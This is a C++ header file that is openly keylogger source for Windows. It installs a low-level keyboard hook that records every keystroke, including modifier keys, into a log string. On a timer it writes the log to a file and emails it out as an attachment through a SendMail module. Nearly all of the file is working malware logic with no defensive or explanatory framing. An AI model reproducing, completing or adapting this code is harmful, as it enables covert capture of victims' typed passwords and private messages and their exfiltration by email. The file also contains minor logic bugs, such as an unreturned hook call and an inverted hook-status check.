#pragma once

#include<iostream>
#include<fstream>
#include<Windows.h>
#include"KeyConstants.h"
#include"Timer.h"
#include"SendMail.h"

std::string logKey = "";

void TimerSendMail() {

	if (logKey.empty())
		return;
	std::string lastFile = IO::WriteLog(logKey);

	if (lastFile.empty()) {
		HelperFunc::WriteAppLog("File creation was not successful KeyLog '" + logKey +"'");
		return;
	}

	int x = Mail::SendMail("Log [" + lastFile + "]",
		"The file has been attached to this mail\n Just for testing: \n" + logKey,
		IO::GetOurPath(true) + lastFile);

	if (x != 7) 
		HelperFunc::WriteAppLog("Mail was not sent! Error code: " + HelperFunc::ToString(x));
	else
		logKey = "";
}

Timer MailTimer(TimerSendMail, 50 , Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OutKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wParam, lParam);

	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lParam;

	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		logKey += Keys::KEYS[kbs->vkCode].Name;
		if (kbs->vkCode == VK_RETURN)
			logKey += '\n';

	}
	else if (wParam == WM_KEYUP || wParam == WM_SYSKEYDOWN) {
		DWORD key = kbs->vkCode;

		switch (key) {
		case VK_LCONTROL:
		case VK_RCONTROL:
		case VK_SHIFT:
		case VK_LSHIFT:
		case VK_RSHIFT:
		case VK_MENU:
		case VK_LMENU:
		case VK_RMENU:
		case VK_CAPITAL:
		case VK_NUMLOCK:
		case VK_LWIN:
		case VK_RWIN:{
			std::string keyName = Keys::KEYS[kbs->vkCode].Name;

			keyName.insert(1, "/");
			logKey += keyName;

		}
					 break;
		}


	}

	return CallNextHookEx(eHook, nCode, wParam, lParam);
}


bool InstallHook() {
	HelperFunc::WriteAppLog("Hook Started and Timer Started!");

	MailTimer.Start(true);

	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OutKeyboardProc, GetModuleHandle(NULL), 0);
	return eHook == NULL;
}

bool UnInstallHook() {
	bool b = (bool)UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return b;
}

bool IsHooked() {
	return (bool)(eHook == NULL);
}